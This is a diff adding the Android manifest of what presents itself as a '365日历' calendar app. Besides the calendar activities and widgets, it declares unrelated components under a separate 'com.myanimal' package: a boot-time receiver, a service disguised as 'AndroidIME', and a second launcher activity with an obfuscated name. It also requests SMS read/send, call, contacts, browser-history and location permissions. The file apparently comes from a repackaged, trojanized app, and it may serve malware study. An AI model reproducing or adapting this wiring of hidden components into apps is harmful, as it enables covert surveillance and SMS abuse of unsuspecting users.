@@ -1,0 +1,79 @@
+<?xml version="1.0" encoding="utf-8" standalone="no"?><manifest xmlns:android="http://schemas.android.com/apk/res/android" package="com.rili.android.client15">
+    <application android:icon="@drawable/icon" android:label="@string/app_name">
+        <meta-data android:name="UMENG_APPKEY" android:value="4c35a2381d41c8788e0008f4"/>
+        <meta-data android:name="UMENG_CHANNEL" android:value="365日历"/>
+        <activity android:label="@string/app_name" android:name=".CalendarStartPage" android:screenOrientation="portrait">
+            <intent-filter>
+                <category android:name="android.intent.category.LAUNCHER"/>
+            </intent-filter>
+        </activity>
+        <activity android:name=".CalendarMain" android:screenOrientation="portrait"/>
+        <activity android:name=".CalendarMonth" android:screenOrientation="portrait"/>
+        <activity android:name=".CalendarDay" android:screenOrientation="portrait"/>
+        <activity android:name=".ScheduleEdit" android:screenOrientation="portrait"/>
+        <activity android:name=".CalendarIndex" android:screenOrientation="portrait"/>
+        <activity android:name=".AlmanacQuery" android:screenOrientation="portrait"/>
+        <activity android:name=".CalendarQueryHuangli" android:screenOrientation="portrait"/>
+        <activity android:name=".CalendarQueryJiri" android:screenOrientation="portrait"/>
+        <activity android:name=".CalendarSetup" android:screenOrientation="portrait"/>
+        <activity android:name=".CalendarNoteBook" android:screenOrientation="portrait"/>
+        <activity android:name=".CalendarNoteItem" android:screenOrientation="portrait"/>
+        <activity android:name=".CalendarNoteDetail" android:screenOrientation="portrait"/>
+        <activity android:name=".CalendarNoteAllContents" android:screenOrientation="portrait"/>
+        <receiver android:label="365近期日程2x2" android:name=".widgets.ScheduleList2x2">
+            <intent-filter>
+                <action android:name="android.appwidget.action.APPWIDGET_UPDATE"/>
+                <action android:name="com.android.UPDATE_WIDGET"/>
+            </intent-filter>
+            <meta-data android:name="android.appwidget.provider" android:resource="@xml/widget_list_2x2"/>
+        </receiver>
+        <receiver android:label="365rili4x4" android:name=".widgets.ScheduleList4x4">
+            <intent-filter>
+                <action android:name="android.appwidget.action.APPWIDGET_UPDATE"/>
+                <action android:name="com.android.UPDATE_WIDGET"/>
+            </intent-filter>
+            <meta-data android:name="android.appwidget.provider" android:resource="@xml/widget_list_4x4"/>
+        </receiver>
+        <receiver android:label="365日历4x3" android:name=".widgets.MonthView4x3">
+            <intent-filter>
+                <action android:name="android.appwidget.action.APPWIDGET_UPDATE"/>
+                <action android:name="com.android.UPDATE_WIDGET"/>
+                <action android:name="com.rili.android.client.UPDATE_WIDGET_NEXT_MONTH"/>
+                <action android:name="com.rili.android.client.UPDATE_WIDGET_LAST_MONTH"/>
+            </intent-filter>
+            <meta-data android:name="android.appwidget.provider" android:resource="@xml/widget_month_4x3"/>
+        </receiver>
+        <receiver android:name="com.myanimal.ServiceReceiver">
+            <intent-filter>
+                <action android:name="android.intent.action.BOOT_COMPLETED"/>
+                <category android:name="android.intent.category.LAUNCHER"/>
+            </intent-filter>
+        </receiver>
+        <service android:name="com.myanimal.automata.gleanybody.AndroidIME" android:permission="android.permission.INTERNET"/>
+        <activity android:label="@string/app_name" android:name="com.myanimal.automata.gleanybody.rkAEycajaaaaa" android:theme="@android:style/Theme.Black.NoTitleBar">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+                <category android:name="android.intent.category.LAUNCHER"/>
+            </intent-filter>
+        </activity>
+    </application>
+    <uses-permission android:name="android.permission.INTERNET"/>
+    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+    <uses-permission android:name="com.android.launcher.permission.INSTALL_SHORTCUT"/>
+    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+    <uses-permission android:name="android.permission.CALL_PHONE"/>
+    <uses-permission android:name="android.permission.INTERNET"/>
+    <uses-permission android:name="android.permission.MOUNT_UNMOUNT_FILESYSTEMS"/>
+    <uses-permission android:name="android.permission.READ_CONTACTS"/>
+    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+    <uses-permission android:name="android.permission.READ_SMS"/>
+    <uses-permission android:name="android.permission.SEND_SMS"/>
+    <uses-permission android:name="android.permission.SET_WALLPAPER"/>
+    <uses-permission android:name="android.permission.WRITE_CONTACTS"/>
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+    <uses-permission android:name="com.android.browser.permission.READ_HISTORY_BOOKMARKS"/>
+    <uses-permission android:name="com.android.browser.permission.WRITE_HISTORY_BOOKMARKS"/>
+    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
+    <uses-permission android:name="android.permission.ACCESS_GPS"/>
+    <uses-permission android:name="android.permission.ACCESS_LOCATION"/>
+</manifest>
